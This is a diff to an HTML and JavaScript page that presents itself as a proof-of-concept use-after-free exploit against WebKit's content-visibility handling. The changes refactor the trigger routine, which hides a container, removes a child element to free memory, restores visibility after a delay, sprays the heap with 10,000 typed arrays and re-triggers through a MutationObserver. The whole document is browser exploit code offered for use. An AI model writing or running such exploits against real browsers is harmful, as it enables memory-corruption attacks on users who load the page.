@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebKit UAF - content-visibility PoC</title>
+    <title>WebKit UAF via content-visibility (Fixed)</title>
     <style>
         .container {
             width: 200px;
@@ -11,6 +11,7 @@
             width: 100px;
             height: 100px;
             background-color: blue;
+            display: block;
         }
     </style>
     <script>
@@ -22,45 +23,65 @@
             log("Starting WebKit UAF PoC...");
 
             const container = document.querySelector('.container');
-            const child = document.querySelector('.child');
+
+            // Wait until child is available
+            let child = document.querySelector('.child');
+            if (!child) {
+                log("Child not found, retrying...");
+                setTimeout(() => {
+                    child = document.querySelector('.child');
+                    if (!child) {
+                        log("Child still not found.");
+                        return;
+                    }
+                    startExploit(container, child);
+                }, 500);
+            } else {
+                startExploit(container, child);
+            }
+        };
+
+        function startExploit(container, child) {
+            log("Child found, starting exploit...");
 
             // MutationObserver to re-trigger UAF
             const observer = new MutationObserver(() => {
-                log("Mutation observed, re-triggering...");
-                triggerUAF();
+                log("Mutation observed, re-triggering UAF...");
+                triggerUAF(container, child);
             });
 
             observer.observe(container, { childList: true });
 
-            function triggerUAF() {
-                try {
-                    // Step 1: Set content-visibility to hidden
-                    container.style.contentVisibility = 'hidden';
+            triggerUAF(container, child);
+        }
 
-                    // Step 2: Remove child (freeing memory)
+        function triggerUAF(container, child) {
+            try {
+                // Step 1: Set content-visibility to hidden
+                container.style.contentVisibility = 'hidden';
+
+                // Step 2: Remove child (freeing memory)
+                if (container.contains(child)) {
                     container.removeChild(child);
-
-                    // Step 3: Delay and restore visibility
-                    setTimeout(() => {
-                        container.style.contentVisibility = 'auto';
-                        log("Restored content-visibility");
-                    }, 100);
-
-                    // Step 4: Heap spray to fill freed memory
-                    window.spray = [];
-                    for (let i = 0; i < 10000; i++) {
-                        window.spray.push(new Uint8Array(0x100));
-                    }
-
-                    log("Heap spray complete.");
-                } catch (e) {
-                    log("Exception: " + e.message);
                 }
-            }
 
-            // Start first trigger
-            triggerUAF();
-        };
+                // Step 3: Delay and restore visibility
+                setTimeout(() => {
+                    container.style.contentVisibility = 'auto';
+                    log("Restored content-visibility");
+                }, 100);
+
+                // Step 4: Heap spray to fill freed memory
+                window.spray = [];
+                for (let i = 0; i < 10000; i++) {
+                    window.spray.push(new Uint8Array(0x100));
+                }
+
+                log("Heap spray complete.");
+            } catch (e) {
+                log("Exception during UAF: " + e.message);
+            }
+        }
     </script>
 </head>
 <body>
